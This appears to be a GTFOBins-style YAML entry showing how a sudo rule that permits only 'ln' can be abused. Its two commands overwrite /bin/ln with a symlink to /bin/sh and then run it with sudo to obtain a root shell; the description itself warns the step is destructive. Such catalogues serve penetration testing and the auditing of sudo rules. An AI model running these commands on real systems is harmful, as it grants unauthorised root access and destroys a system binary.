---
description: This overrides `ln` itself with a symlink to a shell (or any other executable) that is to be executed as root, useful in case a `sudo` rule allows to only run `ln` by path. Warning, this is a destructive action.
functions:
  sudo:
    - code: |
        sudo ln -fs /bin/sh /bin/ln
        sudo ln
---
